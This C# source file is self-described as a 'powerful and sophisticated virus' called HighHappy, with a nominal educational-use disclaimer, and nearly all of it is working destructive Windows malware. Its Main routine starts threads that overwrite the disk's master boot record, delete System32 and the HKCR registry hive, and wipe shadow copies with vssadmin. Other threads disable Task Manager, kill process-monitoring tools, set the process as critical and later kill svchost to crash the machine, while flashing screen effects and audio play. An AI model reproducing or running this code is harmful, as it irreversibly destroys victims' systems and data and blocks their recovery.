
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
// *                                                           *
// *  Copyright © 2024 ABOLHB - FREEMASONRY                    *
// *                                                           *
// *  Project: HighHappy                                       *
// *  Description: Powerful and sophisticated virus            *
// *                                                           *
// *  WARNING: This software is intended for educational       *
// *  and research purposes only Misuse of this software       *
// *  may result in severe consequences                        *
// *                                                           *
// *  Coded By: ABOLHB                                         *
// *  Group: FREEMASONRY                                       *
// *                                                           *
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
class MasonClass
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
    [DllImport("user32.dll")]
    public static extern IntPtr LoadCursor(IntPtr hInstance, uint lpCursorName);
    [DllImport("user32.dll")]
    private static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    private static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
    [DllImport("user32.dll")]
    private static extern IntPtr LoadIcon(IntPtr hInstance, IntPtr lpIconName);
    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);
    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(uint crColor);
    [DllImport("gdi32.dll")]
    private static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);
    [DllImport("gdi32.dll")]
    private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
        IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr hWnd, IntPtr hdc);
    private static readonly IntPtr IDI_ERROR = new IntPtr(0x7F00);
    private static readonly IntPtr IDI_WARNING = new IntPtr(0x7F03);
    private static readonly IntPtr IDI_APPLICATION = new IntPtr(0x7F04);
    public const uint IDC_ARROW = 32512;
    const int SRCCOPY = 0x00CC0020;
    const int MBR_SIZE = 512;
    private const int SM_CXSCREEN = 0;
    private const int SM_CYSCREEN = 1;
    private const int SampleRate = 8000;
    private const int DurationSeconds = 10;
    private const int BufferSize = SampleRate * DurationSeconds;
    public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }
    private static Func<int, int>[] formulas = new Func<int, int>[] {
    t => (t * ((t & 4096) != 0 ? (t % 65536 < 59392 ? 7 : t >> 6) : 16) + (1 & (t >> 14))) >> (3 & -(t >> ((t & 2048) != 0 ? 2 : 10))) | (t >> ((t & 16384) != 0 ? ((t & 4096) != 0 ? 4 : 3) : 2)),
    };
    private static Random random = new Random();
    private static void GDI()
    {
        Random random = new Random();
        int screenW = GetSystemMetrics(SM_CXSCREEN);
        int screenH = GetSystemMetrics(SM_CYSCREEN);
        IntPtr desktopHdc = GetDC(IntPtr.Zero);
        IntPtr hdc = GetDC(IntPtr.Zero);
        while (true)
        {
            desktopHdc = GetDC(IntPtr.Zero);
            BitBlt(desktopHdc, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), desktopHdc, random.Next(screenW), random.Next(screenH), SRCCOPY);
            SelectObject(desktopHdc, CreateSolidBrush((uint)(random.Next(255) << 16 | random.Next(255) << 8 | random.Next(255))));
            int ry = random.Next(screenH);
            IntPtr brush = CreateSolidBrush((uint)(random.Next(255) << 16 | random.Next(255) << 8 | random.Next(255)));
            SelectObject(desktopHdc, brush);

            int x = random.Next(10, screenW - 600);
            int y = random.Next(20, screenH - 600);
            BitBlt(desktopHdc, random.Next(-1380, 451), y, screenW, 600, desktopHdc, 200, y, SRCCOPY);
            BitBlt(desktopHdc, x, random.Next(-1560, 291), 600, screenH, desktopHdc, x, 200, SRCCOPY);
            ReleaseDC(IntPtr.Zero, desktopHdc);
            uint color = (uint)((random.Next(123) << 16) | (random.Next(431) << 8) | random.Next(311));
            IntPtr brush2 = CreateSolidBrush(color);
            SelectObject(hdc, brush2);

            BitBlt(hdc, random.Next(21) - 10, random.Next(21) - 10, screenW, screenH, hdc, 0, 0, 0x9273ecef);
            BitBlt(hdc, random.Next(21) - 10, random.Next(21) - 10, screenW, screenH, hdc, 0, 0, 0x5A0049);
        }
    }
    private static void Smil()
    {
        Random random = new Random();
        int screenW = GetSystemMetrics(SM_CXSCREEN);
        int screenH = GetSystemMetrics(SM_CYSCREEN);

        while (true)
        {
            IntPtr desktopHdc = GetDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktopHdc))
            {
                int x = random.Next(0, screenW);
                int y = random.Next(0, screenH);
                Font font = new Font("Segoe UI Emoji", 78);
                Brush brush = new SolidBrush(Color.FromArgb(random.Next(256), random.Next(256), random.Next(256)));
                g.DrawString("😄", font, brush, x, y);
            }
            ReleaseDC(IntPtr.Zero, desktopHdc);
            System.Threading.Thread.Sleep(50);
        }
    }
    private static void MBR()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] mbrData = new byte[MBR_SIZE];
            Random rand = new Random();
            rand.NextBytes(mbrData);
            fs.Write(mbrData, 0, MBR_SIZE);
        }
    }
    private static void RunIconDrawing()
    {
        IntPtr desktopWindow = GetDesktopWindow();
        IntPtr hDc = GetWindowDC(desktopWindow);
        Random random = new Random();
        while (true)
        {
            int x = random.Next(GetSystemMetrics(SM_CXSCREEN));
            int y = random.Next(GetSystemMetrics(SM_CYSCREEN));
            DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, IDI_ERROR));
            System.Threading.Thread.Sleep(50);
            x = random.Next(GetSystemMetrics(SM_CXSCREEN));
            y = random.Next(GetSystemMetrics(SM_CYSCREEN));
            DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, IDI_WARNING));
            System.Threading.Thread.Sleep(50);
            x = random.Next(GetSystemMetrics(SM_CXSCREEN));
            y = random.Next(GetSystemMetrics(SM_CYSCREEN));
            DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, IDI_APPLICATION));

            System.Threading.Thread.Sleep(50);
        }
    }
    public static void Cursor()
    {
        {
            Random rand = new Random();

            while (true)
            {
                int X = rand.Next(1367);
                int Y = rand.Next(769);
                SetCursorPos(X, Y);
                Thread.Sleep(10);
            }
        }
    }
    private static byte[] GenerateBuffer(Func<int, int> formula)
    {
        byte[] buffer = new byte[BufferSize];
        for (int t = 0; t < BufferSize; t++)
        {
            buffer[t] = (byte)(formula(t) & 0xFF);
        }
        return buffer;
    }
    private static void SaveWav(byte[] buffer, string filePath)
    {
        using (var fs = new FileStream(filePath, FileMode.Create))
        using (var bw = new BinaryWriter(fs))
        {
            bw.Write(new[] { 'R', 'I', 'F', 'F' });
            bw.Write(36 + buffer.Length);
            bw.Write(new[] { 'W', 'A', 'V', 'E' });
            bw.Write(new[] { 'f', 'm', 't', ' ' });
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)1);
            bw.Write(SampleRate);
            bw.Write(SampleRate);
            bw.Write((short)1);
            bw.Write((short)8);
            bw.Write(new[] { 'd', 'a', 't', 'a' });
            bw.Write(buffer.Length);
            bw.Write(buffer);
        }
    }
    private static void PlayBufferLoop(byte[] buffer)
    {
        string tempFilePath = Path.GetTempFileName();
        SaveWav(buffer, tempFilePath);

        using (SoundPlayer player = new SoundPlayer(tempFilePath))
        {
            player.PlayLooping();
            Thread.Sleep(Timeout.Infinite);
        }
        File.Delete(tempFilePath);
    }
    public static void ByteBeat()
    {
        foreach (var formula in Formulas)
        {
            byte[] buffer = GenerateBuffer(formula);
            PlayBufferLoop(buffer);
        }
    }
    private static void BSOD()
    {
        var processes = Process.GetProcessesByName("svchost");
        foreach (var process in processes)
        {
            process.Kill();
        }
    }
    static void RegistryDelete()
    {
        ProcessStartInfo reg_kill = new ProcessStartInfo();
        reg_kill.FileName = "cmd.exe";
        reg_kill.WindowStyle = ProcessWindowStyle.Hidden;
        reg_kill.Arguments = @"/k reg delete HKCR /f";
        Process.Start(reg_kill);
    }
    static void DisableSystemRestore()
    {
        try
        {
            ExecuteCommand("vssadmin delete shadows /for=C: /all");
        }
        catch (Exception)
        {
           
        }
    }
    static void ExecuteCommand(string command)
    {
        ProcessStartInfo processStartInfo = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/C " + command, 
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        Process process = Process.Start(processStartInfo);
        process.WaitForExit(); 
    }
    static void DeleteSystem32Files()
    {
        string system32Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32");
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = $"/c del /s /q \"{system32Path}\"";
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.Start();
        process.WaitForExit();
    }
    static void DisableTaskManager()
    {
        string keyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
        string valueName = "DisableTaskMgr";

        Microsoft.Win32.Registry.SetValue(@"HKEY_CURRENT_USER\" + keyPath, valueName, 1, RegistryValueKind.DWord);
    }
    static void ProcessesKiller()
    {
        string[] processNames =
        {
            "ProcessHacker",   
            "SystemInformer",   
            "Procmon",        
            "Procexp",         
        };

        while (true)
        {
            try
            {
                foreach (string processName in processNames)
                {
                    foreach (var process in Process.GetProcessesByName(processName))
                    {
                        process.Kill();
                    }
                }
            }
            catch { }
            Thread.Sleep(1000);
        }
    }
    static void Main()
    {
        int isCritical = 1;
        int BreakOnTermination = 0x1D;
        Process.EnterDebugMode();
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        Thread effectThread = new Thread(GDI);
        Thread PlayBytebeatAudioLoopThread = new Thread(ByteBeat);
        Thread MBRThread = new Thread(MBR);
        Thread RegDeleteThread = new Thread(RegistryDelete);
        Thread DisableTaskManagerThread = new Thread(DisableTaskManager);
        Thread SmilThread = new Thread(Smil);
        Thread DeleteSystem32FilesThread = new Thread(DeleteSystem32Files);
        Thread DisableSystemRestoreThread = new Thread(DisableSystemRestore);
        Thread ProcessesKillerThread = new Thread(ProcessesKiller);
        Task.Delay(120000).ContinueWith(t => BSOD());
        Thread RunIconDrawingThread = new Thread(RunIconDrawing);
        Thread CursorThread = new Thread(Cursor);
        RunIconDrawingThread.Start();
        effectThread.Start();
        MBRThread.Start();
        SmilThread.Start();
        DeleteSystem32FilesThread.Start();
        DisableSystemRestoreThread.Start();
        RegDeleteThread.Start();
        ProcessesKillerThread.Start();
        DisableTaskManagerThread.Start();
        PlayBytebeatAudioLoopThread.Start();
        MBRThread.Join();
        DisableSystemRestoreThread.Join();
        RegDeleteThread.Join();
        ProcessesKillerThread.Join();
        SmilThread.Join();
        DisableTaskManagerThread.Join();
        DeleteSystem32FilesThread.Join();
        PlayBytebeatAudioLoopThread.Join();
        effectThread.Join();
    }
}